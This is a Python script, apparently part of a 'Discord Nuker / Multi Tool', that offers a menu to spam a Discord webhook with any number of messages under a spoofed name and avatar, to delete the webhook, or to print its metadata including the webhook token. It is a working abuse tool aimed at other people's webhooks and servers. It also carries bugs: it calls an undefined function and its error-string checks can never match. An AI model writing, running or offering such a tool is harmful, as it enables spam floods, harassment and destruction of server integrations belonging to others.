# Developper : waltta#6821 | 
# LOG-YY Discord Nuker / Multi Tool©
# Copyright © 2022 waltta#6821 
# Copyright © LOG-YY-Nuke
######################################################### 


import os
import time
import requests
from time import sleep
from discord import Webhook, RequestsWebhookAdapter

from utilities.Settings.common import proxy

def WebhookComplex(url, username, avatar_url, message):
    webhook = Webhook.from_url(url, adapter=RequestsWebhookAdapter())
    webhook.send(username=username, avatar_url=avatar_url, content=message)
def DeleteWebhook(url):
    webhook = Webhook.from_url(url, adapter=RequestsWebhookAdapter())
    webhook.delete()
def ClearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)
ClearConsole()

print("""
[\x1b[95m1\x1b[95m\x1B[37m] Spam Webhook
[\x1b[95m2\x1b[95m\x1B[37m] Delete Webhook
[\x1b[95m3\x1b[95m\x1B[37m] Webhook Info
[\x1b[95m4\x1b[95m\x1B[37m] Exit
""")

option = int(input("[\x1b[95m>\x1b[95m\x1B[37m] Choice?: "))

while True:
    if option == 1:
        
        count = 0

        url = input("[\x1b[95m>\x1b[95m\x1B[37m] Webhook URL: ")
        username = input("[\x1b[95m>\x1b[95m\x1B[37m] Webhook Username: ")
        avatar_url = input("[\x1b[95m>\x1b[95m\x1B[37m] Avatar URL: ")
        message = input("[\x1b[95m>\x1b[95m\x1B[37m] Message: ")
        amount = int(input("[\x1b[95m>\x1b[95m\x1B[37m] Amount of Messages Sent?: "))

        for i in range(amount):
            try:
                WebhookComplex(url, username, avatar_url, message)
            except Exception as e:
                if e == "404 Not Found (error code: 10015): Unknown Webhook":
                    print("[\x1b[95m>\x1b[95m\x1B[37m] Deleted Webhook!")
                    break
            else:
                count += 1
                print(f'[\x1B[32m>\x1B[37m] Message Sent: {count}')
             
    elif option == 2:

        url = input("[\x1b[95m>\x1b[95m\x1B[37m] Delete Webhook?: ")
        try:
            DeleteWebhook(url)
            print("[\x1B[32m>\x1B[37m] Successfully Deleted")
            break
        except Exception as e:
            if e == "404 Not Found (error code: 10015): Unknown Webhook":
                print("[\x1b[95m>\x1b[95m\x1B[37m] Webhook Not Found!")
            else:
                print(e)
                exit()
    elif option == 3:
        url = input("[\x1b[95m>\x1b[95m\x1B[37m] Webhook INFO: \n")
        try:
            r = requests.get(url)
            json = r.json()

            print("[\x1b[95m>\x1b[95m\x1B[37m] Name: " + json['name'])
            print("[\x1b[95m>\x1b[95m\x1B[37m] Webhook ID: " + json['id'])
            print("[\x1b[95m>\x1b[95m\x1B[37m] Avatar URL: " + f'https://cdn.discordapp.com/avatars/{json["id"]}/{json["avatar"]}.png')
            print("[\x1b[95m>\x1b[95m\x1B[37m] Guild ID: " + json['guild_id'])
            print("[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: " + json['channel_id'])
            print("[\x1b[95m>\x1b[95m\x1B[37m] Webhook Token: " + json['token'])
            time.sleep(5)
            break
        except Exception as e:
            if e == "404 Not Found (error code: 10015): Unknown Webhook":
                print("Webhook Not Found")
            else:
                print(e)
                spammer()
    elif option == 4:
        spammer()
    else:
        print("[\x1b[95m>\x1b[95m\x1B[37m] Invaild Command")
        option = int(input("[\x1b[95m>\x1b[95m\x1B[37m] Choice?: "))